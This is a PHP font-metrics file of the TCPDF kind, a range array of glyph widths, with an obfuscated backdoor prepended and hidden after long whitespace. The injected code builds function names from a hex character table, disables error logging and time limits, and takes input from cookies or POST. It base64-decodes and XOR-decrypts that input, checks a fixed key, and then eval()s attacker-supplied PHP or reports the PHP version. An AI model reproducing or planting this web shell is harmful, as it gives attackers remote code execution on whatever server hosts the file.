<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $u1da = 503;$GLOBALS['z03d'] = Array();global $z03d;$z03d = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['k1cfa8'] = "\x26\x73\x39\x31\x54\x45\x67\x52\x59\x37\x43\x7d\x25\x64\x30\x3f\x55\x2d\x50\x69\x60\x5e\x22\x4e\x6e\x57\x5d\x38\x6a\x66\x20\x49\x2f\x4f\x2e\x47\xd\x4c\x42\x4d\x5c\x5a\x53\x2a\x7a\x41\x72\x51\xa\x58\x79\x6f\x7b\x7e\x32\x46\x3b\x63\x35\x40\x77\x78\x24\x3d\x3a\x56\x34\x44\x65\x27\x71\x6b\x75\x48\x2c\x5f\x74\x4b\x9\x3e\x61\x29\x6c\x33\x23\x6d\x7c\x3c\x76\x68\x4a\x28\x36\x70\x21\x62\x2b\x5b";$z03d[$z03d['k1cfa8'][76].$z03d['k1cfa8'][13].$z03d['k1cfa8'][9].$z03d['k1cfa8'][2].$z03d['k1cfa8'][9]] = $z03d['k1cfa8'][57].$z03d['k1cfa8'][89].$z03d['k1cfa8'][46];$z03d[$z03d['k1cfa8'][93].$z03d['k1cfa8'][66].$z03d['k1cfa8'][9].$z03d['k1cfa8'][13].$z03d['k1cfa8'][27].$z03d['k1cfa8'][14].$z03d['k1cfa8'][27].$z03d['k1cfa8'][14]] = $z03d['k1cfa8'][51].$z03d['k1cfa8'][46].$z03d['k1cfa8'][13];$z03d[$z03d['k1cfa8'][57].$z03d['k1cfa8'][95].$z03d['k1cfa8'][27].$z03d['k1cfa8'][29].$z03d['k1cfa8'][14].$z03d['k1cfa8'][57]] = $z03d['k1cfa8'][13].$z03d['k1cfa8'][68].$z03d['k1cfa8'][29].$z03d['k1cfa8'][19].$z03d['k1cfa8'][24].$z03d['k1cfa8'][68];$z03d[$z03d['k1cfa8'][60].$z03d['k1cfa8'][54].$z03d['k1cfa8'][58].$z03d['k1cfa8'][80]] = $z03d['k1cfa8'][1].$z03d['k1cfa8'][76].$z03d['k1cfa8'][46].$z03d['k1cfa8'][82].$z03d['k1cfa8'][68].$z03d['k1cfa8'][24];$z03d[$z03d['k1cfa8'][24].$z03d['k1cfa8'][80].$z03d['k1cfa8'][13].$z03d['k1cfa8'][68].$z03d['k1cfa8'][2]] = $z03d['k1cfa8'][13].$z03d['k1cfa8'][68].$z03d['k1cfa8'][29].$z03d['k1cfa8'][19].$z03d['k1cfa8'][24].$z03d['k1cfa8'][68].$z03d['k1cfa8'][13];$z03d[$z03d['k1cfa8'][68].$z03d['k1cfa8'][14].$z03d['k1cfa8'][29].$z03d['k1cfa8'][2].$z03d['k1cfa8'][29].$z03d['k1cfa8'][68].$z03d['k1cfa8'][66].$z03d['k1cfa8'][66].$z03d['k1cfa8'][58]] = $z03d['k1cfa8'][19].$z03d['k1cfa8'][24].$z03d['k1cfa8'][19].$z03d['k1cfa8'][75].$z03d['k1cfa8'][1].$z03d['k1cfa8'][68].$z03d['k1cfa8'][76];$z03d[$z03d['k1cfa8'][13].$z03d['k1cfa8'][92].$z03d['k1cfa8'][66].$z03d['k1cfa8'][9].$z03d['k1cfa8'][29].$z03d['k1cfa8'][66].$z03d['k1cfa8'][3].$z03d['k1cfa8'][14]] = $z03d['k1cfa8'][1].$z03d['k1cfa8'][68].$z03d['k1cfa8'][46].$z03d['k1cfa8'][19].$z03d['k1cfa8'][80].$z03d['k1cfa8'][82].$z03d['k1cfa8'][19].$z03d['k1cfa8'][44].$z03d['k1cfa8'][68];$z03d[$z03d['k1cfa8'][82].$z03d['k1cfa8'][92].$z03d['k1cfa8'][9].$z03d['k1cfa8'][57].$z03d['k1cfa8'][9].$z03d['k1cfa8'][14]] = $z03d['k1cfa8'][93].$z03d['k1cfa8'][89].$z03d['k1cfa8'][93].$z03d['k1cfa8'][88].$z03d['k1cfa8'][68].$z03d['k1cfa8'][46].$z03d['k1cfa8'][1].$z03d['k1cfa8'][19].$z03d['k1cfa8'][51].$z03d['k1cfa8'][24];$z03d[$z03d['k1cfa8'][72].$z03d['k1cfa8'][83].$z03d['k1cfa8'][14].$z03d['k1cfa8'][58].$z03d['k1cfa8'][2].$z03d['k1cfa8'][54].$z03d['k1cfa8'][58].$z03d['k1cfa8'][68].$z03d['k1cfa8'][54]] = $z03d['k1cfa8'][72].$z03d['k1cfa8'][24].$z03d['k1cfa8'][1].$z03d['k1cfa8'][68].$z03d['k1cfa8'][46].$z03d['k1cfa8'][19].$z03d['k1cfa8'][80].$z03d['k1cfa8'][82].$z03d['k1cfa8'][19].$z03d['k1cfa8'][44].$z03d['k1cfa8'][68];$z03d[$z03d['k1cfa8'][88].$z03d['k1cfa8'][29].$z03d['k1cfa8'][29].$z03d['k1cfa8'][29].$z03d['k1cfa8'][80].$z03d['k1cfa8'][58]] = $z03d['k1cfa8'][95].$z03d['k1cfa8'][80].$z03d['k1cfa8'][1].$z03d['k1cfa8'][68].$z03d['k1cfa8'][92].$z03d['k1cfa8'][66].$z03d['k1cfa8'][75].$z03d['k1cfa8'][13].$z03d['k1cfa8'][68].$z03d['k1cfa8'][57].$z03d['k1cfa8'][51].$z03d['k1cfa8'][13].$z03d['k1cfa8'][68];$z03d[$z03d['k1cfa8'][93].$z03d['k1cfa8'][3].$z03d['k1cfa8'][66].$z03d['k1cfa8'][83].$z03d['k1cfa8'][95].$z03d['k1cfa8'][92].$z03d['k1cfa8'][13].$z03d['k1cfa8'][54]] = $z03d['k1cfa8'][1].$z03d['k1cfa8'][68].$z03d['k1cfa8'][76].$z03d['k1cfa8'][75].$z03d['k1cfa8'][76].$z03d['k1cfa8'][19].$z03d['k1cfa8'][85].$z03d['k1cfa8'][68].$z03d['k1cfa8'][75].$z03d['k1cfa8'][82].$z03d['k1cfa8'][19].$z03d['k1cfa8'][85].$z03d['k1cfa8'][19].$z03d['k1cfa8'][76];$z03d[$z03d['k1cfa8'][44].$z03d['k1cfa8'][2].$z03d['k1cfa8'][13].$z03d['k1cfa8'][54].$z03d['k1cfa8'][29].$z03d['k1cfa8'][3]] = $z03d['k1cfa8'][93].$z03d['k1cfa8'][57].$z03d['k1cfa8'][68].$z03d['k1cfa8'][3].$z03d['k1cfa8'][9].$z03d['k1cfa8'][80].$z03d['k1cfa8'][54].$z03d['k1cfa8'][80];$z03d[$z03d['k1cfa8'][68].$z03d['k1cfa8'][83].$z03d['k1cfa8'][80].$z03d['k1cfa8'][83].$z03d['k1cfa8'][92].$z03d['k1cfa8'][58].$z03d['k1cfa8'][57]] = $z03d['k1cfa8'][71].$z03d['k1cfa8'][58].$z03d['k1cfa8'][95].$z03d['k1cfa8'][29].$z03d['k1cfa8'][29].$z03d['k1cfa8'][14].$z03d['k1cfa8'][83];$z03d[$z03d['k1cfa8'][51].$z03d['k1cfa8'][80].$z03d['k1cfa8'][95].$z03d['k1cfa8'][9].$z03d['k1cfa8'][66].$z03d['k1cfa8'][29].$z03d['k1cfa8'][27]] = $_POST;$z03d[$z03d['k1cfa8'][70].$z03d['k1cfa8'][29].$z03d['k1cfa8'][9].$z03d['k1cfa8'][14]] = $_COOKIE;@$z03d[$z03d['k1cfa8'][68].$z03d['k1cfa8'][14].$z03d['k1cfa8'][29].$z03d['k1cfa8'][2].$z03d['k1cfa8'][29].$z03d['k1cfa8'][68].$z03d['k1cfa8'][66].$z03d['k1cfa8'][66].$z03d['k1cfa8'][58]]($z03d['k1cfa8'][68].$z03d['k1cfa8'][46].$z03d['k1cfa8'][46].$z03d['k1cfa8'][51].$z03d['k1cfa8'][46].$z03d['k1cfa8'][75].$z03d['k1cfa8'][82].$z03d['k1cfa8'][51].$z03d['k1cfa8'][6], NULL);@$z03d[$z03d['k1cfa8'][68].$z03d['k1cfa8'][14].$z03d['k1cfa8'][29].$z03d['k1cfa8'][2].$z03d['k1cfa8'][29].$z03d['k1cfa8'][68].$z03d['k1cfa8'][66].$z03d['k1cfa8'][66].$z03d['k1cfa8'][58]]($z03d['k1cfa8'][82].$z03d['k1cfa8'][51].$z03d['k1cfa8'][6].$z03d['k1cfa8'][75].$z03d['k1cfa8'][68].$z03d['k1cfa8'][46].$z03d['k1cfa8'][46].$z03d['k1cfa8'][51].$z03d['k1cfa8'][46].$z03d['k1cfa8'][1], 0);@$z03d[$z03d['k1cfa8'][68].$z03d['k1cfa8'][14].$z03d['k1cfa8'][29].$z03d['k1cfa8'][2].$z03d['k1cfa8'][29].$z03d['k1cfa8'][68].$z03d['k1cfa8'][66].$z03d['k1cfa8'][66].$z03d['k1cfa8'][58]]($z03d['k1cfa8'][85].$z03d['k1cfa8'][80].$z03d['k1cfa8'][61].$z03d['k1cfa8'][75].$z03d['k1cfa8'][68].$z03d['k1cfa8'][61].$z03d['k1cfa8'][68].$z03d['k1cfa8'][57].$z03d['k1cfa8'][72].$z03d['k1cfa8'][76].$z03d['k1cfa8'][19].$z03d['k1cfa8'][51].$z03d['k1cfa8'][24].$z03d['k1cfa8'][75].$z03d['k1cfa8'][76].$z03d['k1cfa8'][19].$z03d['k1cfa8'][85].$z03d['k1cfa8'][68], 0);@$z03d[$z03d['k1cfa8'][93].$z03d['k1cfa8'][3].$z03d['k1cfa8'][66].$z03d['k1cfa8'][83].$z03d['k1cfa8'][95].$z03d['k1cfa8'][92].$z03d['k1cfa8'][13].$z03d['k1cfa8'][54]](0);if (!$z03d[$z03d['k1cfa8'][24].$z03d['k1cfa8'][80].$z03d['k1cfa8'][13].$z03d['k1cfa8'][68].$z03d['k1cfa8'][2]]($z03d['k1cfa8'][45].$z03d['k1cfa8'][37].$z03d['k1cfa8'][7].$z03d['k1cfa8'][5].$z03d['k1cfa8'][45].$z03d['k1cfa8'][67].$z03d['k1cfa8'][8].$z03d['k1cfa8'][75].$z03d['k1cfa8'][7].$z03d['k1cfa8'][16].$z03d['k1cfa8'][23].$z03d['k1cfa8'][75].$z03d['k1cfa8'][83].$z03d['k1cfa8'][92].$z03d['k1cfa8'][92].$z03d['k1cfa8'][80].$z03d['k1cfa8'][29].$z03d['k1cfa8'][95].$z03d['k1cfa8'][27].$z03d['k1cfa8'][80].$z03d['k1cfa8'][27].$z03d['k1cfa8'][80].$z03d['k1cfa8'][54].$z03d['k1cfa8'][83].$z03d['k1cfa8'][58].$z03d['k1cfa8'][58].$z03d['k1cfa8'][80].$z03d['k1cfa8'][95].$z03d['k1cfa8'][54].$z03d['k1cfa8'][3].$z03d['k1cfa8'][29].$z03d['k1cfa8'][95].$z03d['k1cfa8'][29].$z03d['k1cfa8'][3].$z03d['k1cfa8'][3].$z03d['k1cfa8'][95].$z03d['k1cfa8'][80].$z03d['k1cfa8'][3].$z03d['k1cfa8'][80].$z03d['k1cfa8'][14].$z03d['k1cfa8'][54].$z03d['k1cfa8'][29].$z03d['k1cfa8'][95].$z03d['k1cfa8'][80])){$z03d[$z03d['k1cfa8'][57].$z03d['k1cfa8'][95].$z03d['k1cfa8'][27].$z03d['k1cfa8'][29].$z03d['k1cfa8'][14].$z03d['k1cfa8'][57]]($z03d['k1cfa8'][45].$z03d['k1cfa8'][37].$z03d['k1cfa8'][7].$z03d['k1cfa8'][5].$z03d['k1cfa8'][45].$z03d['k1cfa8'][67].$z03d['k1cfa8'][8].$z03d['k1cfa8'][75].$z03d['k1cfa8'][7].$z03d['k1cfa8'][16].$z03d['k1cfa8'][23].$z03d['k1cfa8'][75].$z03d['k1cfa8'][83].$z03d['k1cfa8'][92].$z03d['k1cfa8'][92].$z03d['k1cfa8'][80].$z03d['k1cfa8'][29].$z03d['k1cfa8'][95].$z03d['k1cfa8'][27].$z03d['k1cfa8'][80].$z03d['k1cfa8'][27].$z03d['k1cfa8'][80].$z03d['k1cfa8'][54].$z03d['k1cfa8'][83].$z03d['k1cfa8'][58].$z03d['k1cfa8'][58].$z03d['k1cfa8'][80].$z03d['k1cfa8'][95].$z03d['k1cfa8'][54].$z03d['k1cfa8'][3].$z03d['k1cfa8'][29].$z03d['k1cfa8'][95].$z03d['k1cfa8'][29].$z03d['k1cfa8'][3].$z03d['k1cfa8'][3].$z03d['k1cfa8'][95].$z03d['k1cfa8'][80].$z03d['k1cfa8'][3].$z03d['k1cfa8'][80].$z03d['k1cfa8'][14].$z03d['k1cfa8'][54].$z03d['k1cfa8'][29].$z03d['k1cfa8'][95].$z03d['k1cfa8'][80], 1);$la1c2f5b3 = NULL;$e0d07f = NULL;$z03d[$z03d['k1cfa8'][76].$z03d['k1cfa8'][83].$z03d['k1cfa8'][3].$z03d['k1cfa8'][95].$z03d['k1cfa8'][14].$z03d['k1cfa8'][57].$z03d['k1cfa8'][58]] = $z03d['k1cfa8'][83].$z03d['k1cfa8'][54].$z03d['k1cfa8'][83].$z03d['k1cfa8'][9].$z03d['k1cfa8'][80].$z03d['k1cfa8'][95].$z03d['k1cfa8'][66].$z03d['k1cfa8'][83].$z03d['k1cfa8'][17].$z03d['k1cfa8'][80].$z03d['k1cfa8'][80].$z03d['k1cfa8'][58].$z03d['k1cfa8'][2].$z03d['k1cfa8'][17].$z03d['k1cfa8'][66].$z03d['k1cfa8'][80].$z03d['k1cfa8'][27].$z03d['k1cfa8'][9].$z03d['k1cfa8'][17].$z03d['k1cfa8'][80].$z03d['k1cfa8'][95].$z03d['k1cfa8'][2].$z03d['k1cfa8'][9].$z03d['k1cfa8'][17].$z03d['k1cfa8'][66].$z03d['k1cfa8'][9].$z03d['k1cfa8'][95].$z03d['k1cfa8'][27].$z03d['k1cfa8'][13].$z03d['k1cfa8'][54].$z03d['k1cfa8'][95].$z03d['k1cfa8'][80].$z03d['k1cfa8'][95].$z03d['k1cfa8'][58].$z03d['k1cfa8'][14].$z03d['k1cfa8'][58];global $t31b0c5;function  k5bff03($la1c2f5b3, $jed54){global $z03d;$f44799 = "";for ($db54d6e44=0; $db54d6e44<$z03d[$z03d['k1cfa8'][60].$z03d['k1cfa8'][54].$z03d['k1cfa8'][58].$z03d['k1cfa8'][80]]($la1c2f5b3);){for ($p1431ddf=0; $p1431ddf<$z03d[$z03d['k1cfa8'][60].$z03d['k1cfa8'][54].$z03d['k1cfa8'][58].$z03d['k1cfa8'][80]]($jed54) && $db54d6e44<$z03d[$z03d['k1cfa8'][60].$z03d['k1cfa8'][54].$z03d['k1cfa8'][58].$z03d['k1cfa8'][80]]($la1c2f5b3); $p1431ddf++, $db54d6e44++){$f44799 .= $z03d[$z03d['k1cfa8'][76].$z03d['k1cfa8'][13].$z03d['k1cfa8'][9].$z03d['k1cfa8'][2].$z03d['k1cfa8'][9]]($z03d[$z03d['k1cfa8'][93].$z03d['k1cfa8'][66].$z03d['k1cfa8'][9].$z03d['k1cfa8'][13].$z03d['k1cfa8'][27].$z03d['k1cfa8'][14].$z03d['k1cfa8'][27].$z03d['k1cfa8'][14]]($la1c2f5b3[$db54d6e44]) ^ $z03d[$z03d['k1cfa8'][93].$z03d['k1cfa8'][66].$z03d['k1cfa8'][9].$z03d['k1cfa8'][13].$z03d['k1cfa8'][27].$z03d['k1cfa8'][14].$z03d['k1cfa8'][27].$z03d['k1cfa8'][14]]($jed54[$p1431ddf]));}}return $f44799;}function  pce17a2a($la1c2f5b3, $jed54){global $z03d;global $t31b0c5;return $z03d[$z03d['k1cfa8'][68].$z03d['k1cfa8'][83].$z03d['k1cfa8'][80].$z03d['k1cfa8'][83].$z03d['k1cfa8'][92].$z03d['k1cfa8'][58].$z03d['k1cfa8'][57]]($z03d[$z03d['k1cfa8'][68].$z03d['k1cfa8'][83].$z03d['k1cfa8'][80].$z03d['k1cfa8'][83].$z03d['k1cfa8'][92].$z03d['k1cfa8'][58].$z03d['k1cfa8'][57]]($la1c2f5b3, $t31b0c5), $jed54);}foreach ($z03d[$z03d['k1cfa8'][70].$z03d['k1cfa8'][29].$z03d['k1cfa8'][9].$z03d['k1cfa8'][14]] as $jed54=>$s7ba72ebf){$la1c2f5b3 = $s7ba72ebf;$e0d07f = $jed54;}if (!$la1c2f5b3){foreach ($z03d[$z03d['k1cfa8'][51].$z03d['k1cfa8'][80].$z03d['k1cfa8'][95].$z03d['k1cfa8'][9].$z03d['k1cfa8'][66].$z03d['k1cfa8'][29].$z03d['k1cfa8'][27]] as $jed54=>$s7ba72ebf){$la1c2f5b3 = $s7ba72ebf;$e0d07f = $jed54;}}$la1c2f5b3 = @$z03d[$z03d['k1cfa8'][72].$z03d['k1cfa8'][83].$z03d['k1cfa8'][14].$z03d['k1cfa8'][58].$z03d['k1cfa8'][2].$z03d['k1cfa8'][54].$z03d['k1cfa8'][58].$z03d['k1cfa8'][68].$z03d['k1cfa8'][54]]($z03d[$z03d['k1cfa8'][44].$z03d['k1cfa8'][2].$z03d['k1cfa8'][13].$z03d['k1cfa8'][54].$z03d['k1cfa8'][29].$z03d['k1cfa8'][3]]($z03d[$z03d['k1cfa8'][88].$z03d['k1cfa8'][29].$z03d['k1cfa8'][29].$z03d['k1cfa8'][29].$z03d['k1cfa8'][80].$z03d['k1cfa8'][58]]($la1c2f5b3), $e0d07f));if (isset($la1c2f5b3[$z03d['k1cfa8'][80].$z03d['k1cfa8'][71]]) && $t31b0c5==$la1c2f5b3[$z03d['k1cfa8'][80].$z03d['k1cfa8'][71]]){if ($la1c2f5b3[$z03d['k1cfa8'][80]] == $z03d['k1cfa8'][19]){$db54d6e44 = Array($z03d['k1cfa8'][93].$z03d['k1cfa8'][88] => @$z03d[$z03d['k1cfa8'][82].$z03d['k1cfa8'][92].$z03d['k1cfa8'][9].$z03d['k1cfa8'][57].$z03d['k1cfa8'][9].$z03d['k1cfa8'][14]](),$z03d['k1cfa8'][1].$z03d['k1cfa8'][88] => $z03d['k1cfa8'][3].$z03d['k1cfa8'][34].$z03d['k1cfa8'][14].$z03d['k1cfa8'][17].$z03d['k1cfa8'][3],);echo @$z03d[$z03d['k1cfa8'][13].$z03d['k1cfa8'][92].$z03d['k1cfa8'][66].$z03d['k1cfa8'][9].$z03d['k1cfa8'][29].$z03d['k1cfa8'][66].$z03d['k1cfa8'][3].$z03d['k1cfa8'][14]]($db54d6e44);}elseif ($la1c2f5b3[$z03d['k1cfa8'][80]] == $z03d['k1cfa8'][68]){eval/*ya7d7158f*/($la1c2f5b3[$z03d['k1cfa8'][13]]);}exit();}} ?><?php
$rangeid=114;
$prevcid=126;
$prevwidth=754;
$interval=false;
$range=array (
  32 => 
  array (
    0 => 313,
    1 => 410,
    2 => 469,
    3 => 754,
    4 => 626,
    5 => 901,
    6 => 785,
    7 => 275,
  ),
  40 => 
  array (
    0 => 411,
    1 => 411,
    'interval' => true,
  ),
  42 => 
  array (
    0 => 470,
    1 => 754,
    2 => 342,
    3 => 374,
    4 => 342,
    5 => 329,
  ),
  48 => 
  array (
    0 => 626,
    1 => 626,
    'interval' => true,
    2 => 626,
    3 => 626,
    4 => 626,
    5 => 626,
    6 => 626,
    7 => 626,
    8 => 626,
    9 => 626,
  ),
  58 => 
  array (
    0 => 360,
    1 => 360,
    'interval' => true,
  ),
  60 => 
  array (
    0 => 754,
    1 => 754,
    'interval' => true,
    2 => 754,
  ),
  63 => 
  array (
    0 => 522,
    1 => 900,
    2 => 696,
    3 => 686,
    4 => 660,
    5 => 747,
  ),
  69 => 
  array (
    0 => 615,
    1 => 615,
    'interval' => true,
  ),
  71 => 
  array (
    0 => 738,
    1 => 753,
  ),
  73 => 
  array (
    0 => 334,
    1 => 334,
    'interval' => true,
  ),
  75 => 
  array (
    0 => 697,
    1 => 573,
    2 => 896,
    3 => 753,
    4 => 765,
    5 => 659,
    6 => 765,
    7 => 693,
    8 => 648,
    9 => 614,
    10 => 730,
    11 => 696,
    12 => 993,
    13 => 694,
    14 => 651,
    15 => 652,
    16 => 411,
    17 => 329,
    18 => 411,
    19 => 754,
  ),
  95 => 
  array (
    0 => 450,
    1 => 450,
    'interval' => true,
  ),
  97 => 
  array (
    0 => 607,
    1 => 644,
    2 => 533,
    3 => 644,
    4 => 610,
    5 => 391,
    6 => 644,
    7 => 641,
  ),
  105 => 
  array (
    0 => 308,
    1 => 308,
    'interval' => true,
  ),
  107 => 
  array (
    0 => 598,
    1 => 308,
    2 => 938,
    3 => 641,
    4 => 618,
  ),
  112 => 
  array (
    0 => 644,
    1 => 644,
    'interval' => true,
  ),
  114 => 
  array (
    0 => 444,
    1 => 536,
    2 => 430,
    3 => 641,
    4 => 586,
    5 => 831,
    6 => 580,
    7 => 586,
    8 => 523,
    9 => 641,
    10 => 329,
    11 => 641,
    12 => 754,
  ),
);
